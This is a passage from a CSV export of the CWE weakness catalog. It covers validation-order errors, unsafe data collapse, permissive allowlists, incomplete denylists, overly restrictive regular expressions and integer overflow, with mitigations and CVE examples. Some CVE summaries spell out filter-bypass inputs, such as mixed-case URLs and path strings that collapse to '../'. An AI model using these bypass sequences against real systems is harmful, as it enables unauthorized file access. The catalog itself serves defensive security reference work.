text.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0497::REFERENCE:CVE-2000-0498:DESCRIPTION:The server is case sensitive, so filetype handlers treat .jsp and .JSP as different extensions. JSP source code may be read because .JSP defaults to the filetype text.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0498::REFERENCE:CVE-2001-0766:DESCRIPTION:A URL that contains some characters whose case is not matched by the server's filters may bypass access restrictions because the case-insensitive file system will then handle the request after it bypasses the case sensitive filter.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0766::REFERENCE:CVE-2001-0795:DESCRIPTION:Server allows remote attackers to obtain source code of CGI scripts via URLs that contain MS-DOS conventions such as (1) upper case letters or (2) 8.3 file names.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0795::REFERENCE:CVE-2001-1238:DESCRIPTION:Task Manager does not allow local users to end processes with uppercase letters named (1) winlogon.exe, (2) csrss.exe, (3) smss.exe and (4) services.exe via the Process tab which could allow local users to install Trojan horses that cannot be stopped.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1238::REFERENCE:CVE-2003-0411:DESCRIPTION:chain: Code was ported from a case-sensitive Unix platform to a case-insensitive Windows platform where filetype handlers treat .jsp and .JSP as different extensions. JSP source code may be read because .JSP defaults to the filetype text.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0411::REFERENCE:CVE-2002-0485:DESCRIPTION:Leads to interpretation error:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0485::REFERENCE:CVE-1999-0239:DESCRIPTION:Directories may be listed because lower case web requests are not properly handled by the server.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-0239::REFERENCE:CVE-2005-0269:DESCRIPTION:File extension check in forum software only verifies extensions that contain all lowercase letters, which allows remote attackers to upload arbitrary files via file extensions that include uppercase letters.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0269::REFERENCE:CVE-2004-1083:DESCRIPTION:Web server restricts access to files in a case sensitive manner, but the filesystem accesses files in a case insensitive manner, which allows remote attackers to read privileged files using alternate capitalization.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1083::REFERENCE:CVE-2002-2119:DESCRIPTION:Case insensitive passwords lead to search space reduction.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-2119::REFERENCE:CVE-2004-2214:DESCRIPTION:HTTP server allows bypass of access restrictions using URIs with mixed case.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2214::REFERENCE:CVE-2004-2154:DESCRIPTION:Mixed upper/lowercase allows bypass of ACLs.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2154::REFERENCE:CVE-2005-4509:DESCRIPTION:Bypass malicious script detection by using tokens that aren't case sensitive.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-4509::REFERENCE:CVE-2002-1820:DESCRIPTION:Mixed case problem allows admin to have Admin rights (alternate name property).:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1820::REFERENCE:CVE-2007-3365:DESCRIPTION:Chain: uppercase file extensions causes web server to return script source code instead of executing the script.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-3365::REFERENCE:CVE-2021-39155:DESCRIPTION:Chain: A microservice integration and management platform compares the hostname in the HTTP Host header in a case-sensitive way (CWE-178, CWE-1289), allowing bypass of the authorization policy (CWE-863) using a hostname with mixed case or other variations.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-39155::\",::File Processing::,::File or Directory::,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Case Sensitivity (lowercase, uppercase, mixed case)::\",,\"::TYPE:Research Gap:NOTE:These are probably under-studied in Windows and Mac environments, where file names are case-insensitive and thus are subject to equivalence manipulations involving case.::\",\n179,\"Incorrect Behavior Order: Early Validation\",Base,Incomplete,\"The product validates input before applying protection mechanisms that modify the input, which could allow an attacker to bypass the validation via dangerous inputs that only arise after the modification.\",\"Product needs to validate data at the proper time, after data has been canonicalized and cleansed. Early validation is susceptible to various manipulations that result in dangerous inputs that are produced by canonicalization and cleansing.\",::NATURE:ChildOf:CWE ID:20:VIEW ID:1000::NATURE:ChildOf:CWE ID:696:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:Since early validation errors usually arise from improperly implemented defensive mechanisms, it is likely that these will be introduced more frequently as secure programming becomes implemented more widely.::\",\"\",,\"::SCOPE:Access Control:SCOPE:Integrity:IMPACT:Bypass Protection Mechanism:IMPACT:Execute Unauthorized Code or Commands:NOTE:An attacker could include dangerous input that bypasses validation protection mechanisms which can be used to launch various attacks including injection attacks, execute arbitrary code or cause other unintended behavior.::\",\"\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::\",\"::REFERENCE:CVE-2002-0433:DESCRIPTION:Product allows remote attackers to view restricted files via an HTTP request containing a * (wildcard or asterisk) character.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0433::REFERENCE:CVE-2003-0332:DESCRIPTION:Product modifies the first two letters of a filename extension after performing a security check, which allows remote attackers to bypass authentication via a filename with a .ats extension instead of a .hts extension.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0332::REFERENCE:CVE-2002-0802:DESCRIPTION:Database consumes an extra character when processing a character that cannot be converted, which could remove an escape character from the query and make the application subject to SQL injection attacks.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0802::REFERENCE:CVE-2000-0191:DESCRIPTION:Overlaps fakechild/../realchild:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0191::REFERENCE:CVE-2004-2363:DESCRIPTION:Product checks URI for < and other literal characters, but does it before hex decoding the URI, so %3E and other sequences are allowed.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2363::REFERENCE:CVE-2002-0934:DESCRIPTION:Directory traversal vulnerability allows remote attackers to read or modify arbitrary files via invalid characters between two . (dot) characters, which are filtered and result in a .. sequence.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0934::REFERENCE:CVE-2003-0282:DESCRIPTION:Directory traversal vulnerability allows attackers to overwrite arbitrary files via invalid characters between two . (dot) characters, which are filtered and result in a .. sequence.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0282::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Early Validation Errors::\",::3::43::71::,\"::TYPE:Research Gap:NOTE:These errors are mostly reported in path traversal vulnerabilities, but the concept applies whenever validation occurs.::\",\n182,\"Collapse of Data into Unsafe Value\",Base,Draft,\"The product filters data in a way that causes it to be reduced or collapsed into an unsafe value that violates an expected security property.\",\"\",::NATURE:ChildOf:CWE ID:693:VIEW ID:1000:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:33:VIEW ID:1000::NATURE:CanPrecede:CWE ID:34:VIEW ID:1000::NATURE:CanPrecede:CWE ID:35:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:STRATEGY:Input Validation:DESCRIPTION:Avoid making decisions based on names of resources (e.g. files) if those resources can have alternate names.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::PHASE::DESCRIPTION:Canonicalize the name to match that of the file system's representation of the name. This can sometimes be achieved with an available API (e.g. in Win32 the GetFullPathName function).::\",\"::REFERENCE:CVE-2004-0815:DESCRIPTION:/.//// in pathname collapses to absolute path.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0815::REFERENCE:CVE-2005-3123:DESCRIPTION:/.//..//////././ is collapsed into /.././ after .. and // sequences are removed.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-3123::REFERENCE:CVE-2002-0325:DESCRIPTION:.../...// collapsed to ... due to removal of ./ in web server.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0325::REFERENCE:CVE-2002-0784:DESCRIPTION:chain: HTTP server protects against .. but allows . variants such as ////./../.../. If the server removes /.. sequences, the result would collapse into an unsafe value ////../ (CWE-182).:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0784::REFERENCE:CVE-2005-2169:DESCRIPTION:MFV. Regular expression intended to protect against directory traversal reduces .../...// to ../.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2169::REFERENCE:CVE-2001-1157:DESCRIPTION:XSS protection mechanism strips a <script> sequence that is nested in another <script> sequence.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1157::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Collapse of Data into Unsafe Value::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:IDS11-J:ENTRY NAME:Eliminate noncharacter code points before validation::\",,\"::TYPE:Relationship:NOTE:Overlaps regular expressions, although an implementation might not necessarily use regexp's.::\",\n183,\"Permissive List of Allowed Inputs\",Base,Draft,\"The product implements a protection mechanism that relies on a list of inputs (or properties of inputs) that are explicitly allowed by policy because the inputs are assumed to be safe, but the list is too permissive - that is, it allows an input that is unsafe, leading to resultant weaknesses.\",\"\",::NATURE:ChildOf:CWE ID:697:VIEW ID:1000:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:434:VIEW ID:1000::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"::TERM:Allowlist / Allow List:DESCRIPTION:This is used by CWE and CAPEC instead of other commonly-used terms. Its counterpart is denylist.::TERM:Safelist / Safe List:DESCRIPTION:This is often used by security tools such as firewalls, email or web gateways, proxies, etc.::TERM:Whitelist / White List:DESCRIPTION:This term is frequently used, but usage has been declining as organizations have started to adopt other terms.::\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"\",\"::REFERENCE:CVE-2019-12799:DESCRIPTION:chain: bypass of untrusted deserialization issue (CWE-502) by using an assumed-trusted class (CWE-183):LINK:https://www.cve.org/CVERecord?id=CVE-2019-12799::REFERENCE:CVE-2019-10458:DESCRIPTION:sandbox bypass using a method that is on an allowlist:LINK:https://www.cve.org/CVERecord?id=CVE-2019-10458::REFERENCE:CVE-2017-1000095:DESCRIPTION:sandbox bypass using unsafe methods that are on an allowlist:LINK:https://www.cve.org/CVERecord?id=CVE-2017-1000095::REFERENCE:CVE-2019-10458:DESCRIPTION:CI/CD pipeline feature has unsafe elements in allowlist, allowing bypass of script restrictions:LINK:https://www.cve.org/CVERecord?id=CVE-2019-10458::REFERENCE:CVE-2017-1000095:DESCRIPTION:Default allowlist includes unsafe methods, allowing bypass of sandbox:LINK:https://www.cve.org/CVERecord?id=CVE-2017-1000095::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Permissive Whitelist::\",::120::3::43::71::,\"\",\n184,\"Incomplete List of Disallowed Inputs\",Base,Draft,\"The product implements a protection mechanism that relies on a list of inputs (or properties of inputs) that are not allowed by policy or otherwise require other action to neutralize before additional processing takes place, but the list is incomplete, leading to resultant weaknesses.\",\"Developers often try to protect their products against malicious input by performing tests against inputs that are known to be bad, such as special characters that can invoke new commands. However, such lists often only account for the most well-known bad inputs. Attackers may be able to find other malicious inputs that were not expected by the developer, allowing them to bypass the intended protection mechanism.\",::NATURE:ChildOf:CWE ID:693:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:1023:VIEW ID:1000::NATURE:CanPrecede:CWE ID:79:VIEW ID:1000:CHAIN ID:692::NATURE:CanPrecede:CWE ID:78:VIEW ID:1000::NATURE:CanPrecede:CWE ID:434:VIEW ID:1000::NATURE:CanPrecede:CWE ID:98:VIEW ID:1000::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"::TERM:Denylist / Deny List:DESCRIPTION:This is used by CWE and CAPEC instead of other commonly-used terms. Its counterpart is allowlist.::TERM:Blocklist / Block List:DESCRIPTION:This is often used by security tools such as firewalls, email or web gateways, proxies, etc.::TERM:Blacklist / Black List:DESCRIPTION:This term is frequently used, but usage has been declining as organizations have started to adopt other terms.::\",\"::PHASE:Implementation:NOTE:Developers might begin to develop a list of bad inputs as a fast way to fix a particular weakness, instead of fixing the root cause. See [REF-141].::PHASE:Architecture and Design:NOTE:The design might rely solely on detection of malicious inputs as a protection mechanism.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism::\",\"::METHOD:Black Box:DESCRIPTION:Exploitation of a vulnerability with commonly-used manipulations might fail, but minor variations might succeed.::\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Do not rely exclusively on detecting disallowed inputs. There are too many variants to encode a character, especially when different environments are used, so there is a high likelihood of missing some variants. Only use detection of disallowed inputs as a mechanism for detecting suspicious activity. Ensure that you are using other protection mechanisms that only identify good input - such as lists of allowed inputs - and ensure that you are properly encoding your outputs.::\",\"::REFERENCE:CVE-2024-4315:DESCRIPTION:Chain: API for text generation using Large Language Models (LLMs) does not include the Windows folder separator in its denylist (CWE-184) when attempting to prevent Local File Inclusion via path traversal (CWE-22), allowing deletion of arbitrary files on Windows systems.:LINK:https://www.cve.org/CVERecord?id=CVE-2024-4315::REFERENCE:CVE-2008-2309:DESCRIPTION:product uses a denylist to identify potentially dangerous content, allowing attacker to bypass a warning:LINK:https://www.cve.org/CVERecord?id=CVE-2008-2309::REFERENCE:CVE-2005-2782:DESCRIPTION:PHP remote file inclusion in web application that filters http and https URLs, but not ftp.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2782::REFERENCE:CVE-2004-0542:DESCRIPTION:Programming language does not filter certain shell metacharacters in Windows environment.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0542::REFERENCE:CVE-2004-0595:DESCRIPTION:XSS filter doesn't filter null characters before looking for dangerous tags, which are ignored by web browsers. MIE and validate-before-cleanse.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0595::REFERENCE:CVE-2005-3287:DESCRIPTION:Web-based mail product doesn't restrict dangerous extensions such as ASPX on a web server, even though others are prohibited.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-3287::REFERENCE:CVE-2004-2351:DESCRIPTION:Resultant XSS when only <script> and <style> are checked.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2351::REFERENCE:CVE-2005-2959:DESCRIPTION:Privileged program does not clear sensitive environment variables that are used by bash. Overlaps multiple interpretation error.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2959::REFERENCE:CVE-2005-1824:DESCRIPTION:SQL injection protection scheme does not quote the special character.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1824::REFERENCE:CVE-2005-2184:DESCRIPTION:Detection of risky filename extensions prevents users from automatically executing .EXE files, but .LNK is accepted, allowing resultant Windows symbolic link.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2184::REFERENCE:CVE-2007-1343:DESCRIPTION:Product uses list of protected variables, but accidentally omits one dangerous variable, allowing external modification:LINK:https://www.cve.org/CVERecord?id=CVE-2007-1343::REFERENCE:CVE-2007-5727:DESCRIPTION:Chain: product only removes SCRIPT tags (CWE-184), enabling XSS (CWE-79):LINK:https://www.cve.org/CVERecord?id=CVE-2007-5727::REFERENCE:CVE-2006-4308:DESCRIPTION:Chain: product only checks for use of javascript: tag (CWE-184), allowing XSS (CWE-79) using other tags:LINK:https://www.cve.org/CVERecord?id=CVE-2006-4308::REFERENCE:CVE-2007-3572:DESCRIPTION:Chain: OS command injection (CWE-78) enabled by using an unexpected character that is not explicitly disallowed (CWE-184):LINK:https://www.cve.org/CVERecord?id=CVE-2007-3572::REFERENCE:CVE-2002-0661:DESCRIPTION:not in list of disallowed values for web server, allowing path traversal attacks when the server is run on Windows and other OSes.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0661::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Incomplete Blacklist::\",::120::15::182::3::43::6::71::73::85::,\"::TYPE:Relationship:NOTE:Multiple interpretation errors can indirectly introduce inputs that should be disallowed. For example, a list of dangerous shell metacharacters might not include a metacharacter that only has meaning in one particular shell, not all of them; or a check for XSS manipulations might ignore an unusual construct that is supported by one web browser, but not others.::\",\n186,\"Overly Restrictive Regular Expression\",Base,Draft,\"A regular expression is overly restrictive, which prevents dangerous values from being detected.\",\"This weakness is not about regular expression complexity. Rather, it is about a regular expression that does not match all values that are intended. Consider the use of a regexp to identify acceptable values or to spot unwanted terms. An overly restrictive regexp misses some potentially security-relevant values leading to either false positives *or* false negatives, depending on how the regexp is being used within the code. Consider the expression /[0-8]/ where the intention was /[0-9]/. This expression is not complex but the value 9 is not matched when maybe the programmer planned to check for it.\",::NATURE:ChildOf:CWE ID:185:VIEW ID:1000:ORDINAL:Primary::NATURE:CanAlsoBe:CWE ID:184:VIEW ID:1000::NATURE:CanAlsoBe:CWE ID:183:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Regular expressions can become error prone when defining a complex language even for those experienced in writing grammars. Determine if several smaller regular expressions simplify one large regular expression. Also, subject your regular expression to thorough testing techniques such as equivalence partitioning, boundary value analysis, and robustness. After testing and a reasonable confidence level is achieved, a regular expression may not be foolproof. If an exploit is allowed to slip through, then record the exploit and refactor your regular expression.::\",\"::REFERENCE:CVE-2005-1604:DESCRIPTION:MIE. .php.ns bypasses .php$ regexp but is still parsed as PHP by Apache. (manipulates an equivalence property under Apache):LINK:https://www.cve.org/CVERecord?id=CVE-2005-1604::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Overly Restrictive Regular Expression::\",,\"::TYPE:Relationship:NOTE:Can overlap allowlist/denylist errors (CWE-183/CWE-184)::\",\n190,\"Integer Overflow or Wraparound\",Base,Stable,\"The product performs a calculation that can produce an integer overflow or wraparound when the logic assumes that the resulting value will always be larger than the original value. This occurs when an integer value is incremented to a value that is too large to store in the associated representation. When this occurs, the value may become a very small or negative number.\",\"\",::NATURE:ChildOf:CWE ID:682:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:682:VIEW ID:1003:ORDINAL:Primary::NATURE:ChildOf:CWE ID:20:VIEW ID:700:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:119:VIEW ID:1000:CHAIN ID:680::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"::TERM:Overflow:DESCRIPTION:The terms overflow and wraparound are used interchangeably by some people, but they can have more precise distinctions by others. See Terminology Notes.::TERM:Wraparound:DESCRIPTION:The terms overflow and wraparound are used interchangeably by some people, but they can have more precise distinctions by others. See Terminology Notes.::TERM:wrap, wrap-around, wrap around:DESCRIPTION:Alternate spellings of wraparound::\",\"::PHASE:Implementation:NOTE:This weakness may become security critical when determining the offset or size in behaviors such as memory allocation, copying, and concatenation.::\",\"\",,\"::SCOPE:Availability:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:DoS: Resource Consumption (Memory):IMPACT:DoS: Instability:NOTE:This weakness can generally lead to undefined behavior and therefore crashes. When the calculated result is used for resource allocation, this weakness can cause too many (or too few) resources to be allocated, possibly enabling crashes if the product requests more resources than can be provided.::SCOPE:Integrity:IMPACT:Modify Memory:NOTE:If the value in question is important to data (as opposed to flow), simple data corruption has occurred. Also, if the overflow/wraparound results in other conditions such as buffer overflows, further memory corruption may occur.::SCOPE:Confidentiality:SCOPE:Availability:SCOPE:Access Control:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Bypass Protection Mechanism:NOTE:This weakness can sometimes trigger buffer overflows, which can be used to execute arbitrary code. This is usually outside the scope of the product's implicit security policy.::SCOPE:Availability:SCOPE:Other:IMPACT:Alter Execution Logic:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:DoS: Resource Consumption (CPU):NOTE:If the overflow/wraparound occurs in a loop index variable, this could cause the loop to terminate at the wrong time - too early, too late, or not at all (i.e., infinite loops). With too many iterations, some loops could consume too many resources such as memory, file handles, etc., possibly leading to a crash or other DoS.::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism:NOTE:If integer values are used in security-critical decisions, such as calculating quotas or allocation limits, integer overflows can be used to cause an incorrect security decision.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives.:EFFECTIVENESS:High::METHOD:Black Box:DESCRIPTION:Sometimes, evidence of this weakness can be detected using dynamic tools and techniques that interact with the product using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The product's operation may slow down, but it should not become unstable, crash, or generate incorrect results.:EFFECTIVENESS:Moderate::METHOD:Manual Analysis:DESCRIPTION:This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. Specifically, manual static analysis is useful for evaluating the correctness of allocation calculations. This can be useful for detecting overflow conditions (CWE-190) or similar weaknesses that might have serious security impacts on the program.:EFFECTIVENESS:High::METHOD:Automated Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Bytecode Weakness Analysis - including disassembler + source code weakness analysis Binary Weakness Analysis - including disassembler + source code weakness analysis:EFFECTIVENESS:High::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Fuzz Tester Framework-based Fuzzer:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Manual Source Code Review (not inspections):EFFECTIVENESS:SOAR Partial::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Source code Weakness Analyzer Context-configured Source Code Weakness Analyzer:EFFECTIVENESS:High::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Formal Methods / Correct-By-Construction Cost effective for partial coverage: Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.):EFFECTIVENESS:High::\",\"::PHASE:Requirements:DESCRIPTION:Ensure that all protocols are strictly defined, such that all out-of-bounds behavior can be identified simply, and require strict conformance to the protocol.::PHASE:Requirements:STRATEGY:Language Selection:DESCRIPTION:Use a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. If possible, choose a language or compiler that performs automatic bounds checking.::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. Use libraries or frameworks that make it easier to handle numbers without unexpected consequences. Examples include safe integer handling packages such as SafeInt (C++) or IntegerLib (C or C++). [REF-106]::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Perform input validation on any numeric input by ensuring that it is within the expected range. Enforce that the input meets both the minimum and maximum requirements for the expected range. Use unsigned integers where possible. This makes it easier to perform validation for integer overflows. When signed integers are required, ensure that the range check includes minimum values as well as maximum values.::PHASE:Implementation:DESCRIPTION:Understand the programming language's underlying representation and how it interacts with numeric calculation (CWE-681). Pay close attention to byte size discrepancies, precision, signed/unsigned distinctions, truncation, conversion and casting between types, not-a-number calculations, and how the language handles numbers that are too large or too small for its underlying representation. [REF-7] Also be careful to account for 32-bit, 64-bit, and other potential differences that may affect the numeric representation.::PHASE:Architecture and Design:DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.::PHASE:Implementation:STRATEGY:Compilation or Build Hardening:DESCRIPTION:Examine compiler warnings closely and eliminate problems with potential security implications, such as signed / unsigned mismatch in memory operations, or use of uninitialized variables. Even if the weakness is rarely exploitable, a single failure may lead to the compromise of the entire system.::\",\"::REFERENCE:CVE-2021-43537:DESCRIPTION:Chain: in a web browser, an unsigned 64-bit integer is forcibly cast to a 32-bit integer (CWE-681) and potentially leading to an integer overflow (CWE-190). If an integer overflow occurs, this can cause heap memory corruption (CWE-122):LINK:https://www.cve.org/CVERecord?id=CVE-2021-43537::REFERENCE:CVE-2022-21668:DESCRIPTION:Chain: Python library does not limit the resources used to process images that specify a very large number of bands (CWE-1284), leading to excessive memory consumption (CWE-789) or an integer overflow (CWE-190).:LINK:https://www.cve.org/CVERecord?id=CVE-2022-21668::REFERENCE:CVE-2022-0545:DESCRIPTION:Chain: 3D renderer has an integer overflow (CWE-190) leading to write-what-where condition (CWE-123) using a crafted image.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-0545::REFERENCE:CVE-2021-30860:DESCRIPTION:Chain: improper input validation (CWE-20) leads to integer overflow (CWE-190) in mobile OS, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-30860::REFERENCE:CVE-2021-30663:DESCRIPTION:Chain: improper input validation (CWE-20) leads to integer overflow (CWE-190) in mobile OS, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-30663::REFERENCE:CVE-2018-10887:DESCRIPTION:Chain: unexpected sign extension (CWE-194) leads to integer overflow (CWE-190), causing an out-of-bounds read (CWE-125):LINK:https://www.cve.org/CVERecord?id=CVE-2018-10887::REFERENCE:CVE-2019-1010006:DESCRIPTION:Chain: compiler optimization (CWE-733) removes or modifies code used to detect integer overflow (CWE-190), allowing out-of-bounds write (CWE-787).:LINK:https://www.cve.org/CVERecord?id=CVE-2019-1010006::REFERENCE:CVE-2010-1866:DESCRIPTION:Chain: integer overflow (CWE-190) causes a negative signed value, which later bypasses a maximum-only check (CWE-839), leading to heap-based buffer overflow (CWE-122).:LINK:https://www.cve.org/CVERecord?id=CVE-2010-1866::REFERENCE:CVE-2010-2753:DESCRIPTION:Chain: integer overflow leads to use-after-free:LINK:https://www.cve.org/CVERecord?id=CVE-2010-2753::REFERENCE:CVE-2005-1513:DESCRIPTION:Chain: integer overflow in securely-coded mail program leads to buffer overflow. In 2005, this was regarded as unrealistic to exploit, but in 2020, it was rediscovered to be easier to exploit due to evolutions of the technology.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1513::REFERENCE:CVE-2002-0391:DESCRIPTION:Integer overflow via a large number of arguments.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0391::REFERENCE:CVE-2002-0639:DESCRIPTION:Integer overflow in OpenSSH as listed in the demonstrative examples.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0639::REFERENCE:CVE-2005-1141:DESCRIPTION:Image with large width and height leads to integer overflow.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1141::REFERENCE:CVE-2005-0102:DESCRIPTION:Length value of -1 leads to allocation of 0 bytes and resultant heap overflow.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0102::REFERENCE:CVE-2004-2013:DESCRIPTION:Length value of -1 leads to allocation of 0 bytes and resultant heap overflow.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2013::REFERENCE:CVE-2017-1000121:DESCRIPTION:chain: unchecked message size metadata allows integer overflow (CWE-190) leading to buffer overflow (CWE-119).:LINK:https://www.cve.org/CVERecord?id=CVE-2017-1000121::REFERENCE:CVE-2013-1591:DESCRIPTION:Chain: an integer overflow (CWE-190) in the image size calculation causes an infinite loop (CWE-835) which sequentially allocates buffers without limits (CWE-1325) until the stack is full.:LINK:https://www.cve.org/CVERecord?id=CVE-2013-1591::\",::Number Processing::Memory Management::Counters::,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Integer overflow (wrap or wraparound)::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Integer Overflow::TAXONOMY NAME:CLASP:ENTRY NAME:Integer overflow::TAXONOMY 